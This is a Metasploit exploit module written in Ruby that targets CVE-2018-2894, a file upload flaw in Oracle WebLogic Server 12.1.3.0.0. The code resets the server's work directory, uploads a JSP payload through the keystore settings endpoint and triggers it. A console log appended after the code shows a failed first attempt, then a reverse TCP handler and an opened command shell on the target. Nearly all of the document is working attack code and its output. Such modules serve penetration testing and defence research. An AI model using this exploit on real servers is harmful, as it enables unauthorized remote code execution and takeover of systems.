require 'msf/core'
require 'rex/mime'
require 'rexml/document'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle WebLogic Server JKS Keystores File Upload and Execute',
      'Description'    => %q{
        This module exploits a arbitrary file upload vulnerability in Oracle WebLogic Server
       12.1.3.0.0. 
      },
      'Author'         => [ 'Mario Ceballos' ],
      'License'        => 'BSD_LICENSE',
      'Platform'       => 'win',
      'Privileged'     => true,
      'References'     =>
        [
          [ 'URL', 'https://www.oracle.com/' ],
          [ 'CVE', '2018-2894' ],
        ],
      'Targets'        =>
        [
          [ 'Oracle WebLogic Server 12.1.3.0.0',
            {
              'Arch'     => ARCH_JAVA,
              'Payload'  =>
                {
                  'DisableNops' => true,
                },
            }
          ],
        ],
      'DefaultOptions' =>
        {
          'SHELL' => '/bin/sh'
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 2018'
    ))

    register_options( [ Opt::RPORT(7001) ], self.class )
  end

  def exploit
   print_status "Obtaining current working directory..."
   res = send_request_raw({
     'uri'   => "/ws_utc/resources/setting/options/general",
     'method' => 'GET',
   },25)

   if res and res.code == 200
     rawxml = REXML::Document.new(res.body)
     root = rawxml.root
     path = root.elements[1].elements['options/parameter/defaultValue/']
     print_good "Current Working Directory Is:"
     cwd = path[0].to_s.match(/(.*)\/base_domain/)
     print_good "#{cwd}"
     print_status "Setting New Working Directory..."
     # WebLogic Server Version: 12.1.3.0.0
     newcwd = cwd.to_s + "/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/"
     print_good "#{newcwd}"

     newpath =  "setting_id=general&BasicConfigOptions.workDir=#{newcwd}"
     newpath << "&BasicConfigOptions.proxyHost=&BasicConfigOptions.proxyPort=80"

     res = send_request_cgi({
       'uri'    => '/ws_utc/resources/setting/options',
       'method' => 'POST',
       'data'   => newpath,
     },5)

     if res and res.body =~ /Save successfully/
       print_status "New Configuration Set!"

       name = Rex::Text.rand_text_alpha_upper(5) + ".jsp"

       dbl = Rex::MIME::Message.new
       dbl.add_part("#{rand_text_alpha_lower(10)}", nil, nil, "form-data; name=\"ks_name\"")
       dbl.add_part("false", nil, nil, "form-data; name=\"ks_edit_mode\"")
       dbl.add_part("#{rand_text_alpha_lower(10)}", nil, nil, "form-data; name=\"ks_password_front\"")
       dbl.add_part("#{rand_text_alpha_lower(10)}", nil, nil, "form-data; name=\"ks_password\"")
       dbl.add_part("true", nil, nil, "form-data; name=\"ks_password_change\"")
       dbl.add_part(payload.encoded, "application/octet-stream", nil, "form-data; name=\"ks_filename\"; filename=\"#{name}\"")
       form = dbl.to_s

       res = send_request_cgi({
         'uri' => "/ws_utc/resources/setting/keystore?timestamp=#{Time.now.to_i}",
         'method' => 'POST',
         'ctype'   => "multipart/form-data; boundary=#{dbl.bound}",
         'data' => form,
       },5)

       if res and res.body =~ /#{name}/
         print_status "Upload Success!"
         ids = Array.new
         rawxml = REXML::Document.new(res.body)
         root = rawxml.root
         root.each_element('//id') do |x|
           ids << x[0]
         end
         fd = ids.last.to_s + "_#{name}"
         print_good "Payload File is: #{fd}"

         print_status "Triggering Payload..."
         res = send_request_raw({'uri' => "/bea_wls_internal/config/keystore/" + fd},5)
         handler
       else
         print_error "Failed!"
       end

     else
       print_error "Failed!"
     end

   else
     print_error "Failed"
   end

  end
end
__END__
msf exploit(weblogic_keystores) > exploit

[*] Started reverse TCP handler on 192.168.3.203:65535 
[*] Obtaining current working directory...
[+] Current Working Directory Is:
[-] Exploit failed: NoMethodError undefined method `[]' for nil:NilClass
[*] Exploit completed, but no session was created.
msf exploit(weblogic_keystores) > rexploit
[*] Reloading module...

[*] Started reverse TCP handler on 192.168.3.203:65535 
[*] Obtaining current working directory...
[+] Current Working Directory Is:
[+] /home/oracle/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain
[*] Setting New Working Directory...
[+] /home/oracle/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/
[*] New Configuration Set!
[*] Upload Success!
[+] Payload File is: 1532419551752_ZDLWR.jsp
[*] Triggering Payload...
[*] Command shell session 1 opened (192.168.3.203:65535 -> 192.168.3.134:43874) at 2018-07-24 14:08:30 +0000

pwd
/home/oracle/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain

